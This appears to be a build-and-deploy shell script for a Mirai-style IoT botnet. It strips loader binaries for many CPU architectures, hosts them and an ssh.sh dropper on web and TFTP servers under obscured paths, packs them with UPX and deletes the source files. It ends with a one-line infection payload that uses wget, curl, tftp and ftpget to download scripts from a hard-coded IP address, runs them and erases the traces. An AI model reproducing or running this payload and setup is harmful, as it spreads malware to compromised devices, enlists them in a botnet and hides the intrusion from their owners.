or1k-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr2/release/dlr.or1k
riscv64-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr2/release/dlr.riscv64
sh4-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.hsh-sh4
x86_64-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.x86_64
i686-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.i686
xtensa-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.xtensa
arc-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arc
alpha-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr2/release/dlr.alpha
arc-linux-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr2/release/dlr.arc

mv ~/dlr/release/dlr* ~/loader/bins
go build -o loader/scanListen scanListen.go
rm -rf ~/dlr ~/loader/src ~/bot ~/scanListen.go ~/Projects ~/build.sh ~/botH

cp ssh.sh /var/www/html/swrgiuhguhwrguiwetu



# Moving our new website >:3
cp index.html /var/www/html/swrgiuhguhwrguiwetu
cp css /var/www/html/swrgiuhguhwrguiwetu
cp img /var/www/html/swrgiuhguhwrguiwetu

cp index.html /var/www/html/13747243572475
cp css /var/www/html/13747243572475
cp img /var/www/html/13747243572475

cp index.html /var/www/html/
cp css /var/www/html/
cp img /var/www/html/
cp payload.sh /var/www/html

cp release/h* /var/www/html/13747243572475

cp release/* /var/www/html/swrgiuhguhwrguiwetu
cp release/* /var/lib/tftpboot
rm -rf release

chmod 777 upx
./upx --ultra-brute /var/www/html/13747243572475/*
./upx --ultra-brute /var/www/html/*
./upx --ultra-brute /var/lib/tftpboot/*
./upx --ultra-brute /var/www/html/swrgiuhguhwrguiwetu/*

rm -rf upx*
rm -rf installs.sh
rm -rf tftp.py 
rm -rf loader2
rm -rf enc.c
rm -rf build_payload.py
rm -rf installs.sh
rm -rf loader_build.sh
rm -rf Cnc\ old/
rm -rf dlr2
rm -rf img
rm -rf css
rm -rf zte.go
rm -rf ssh.sh
rm -rf senc.c


python tftp.py
python build_payload.py


echo "payload = cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.200/swrgiuhguhwrguiwetu/ssh.sh; curl -O http://185.244.25.200/ssh.sh; chmod 777 ssh.sh; sh ssh.sh; tftp 185.244.25.200 -c get ssh.sh; chmod 777 ssh.sh; sh bin; tftp -r ssh2 -g 185.244.25.200; chmod 777 bin2; sh bin2; ftpget -v -u anonymous -p anonymous -P 21 185.244.25.200 bin1 bin1; sh bin1; rm -rf ssh.sh ssh.sh ssh.sh2 ssh.sh1; rm -rf *"



# serverip=$(ip addr show |grep 'inet '|grep -v 127.0.0.1 |awk '{print $2}'| cut -d/ -f1)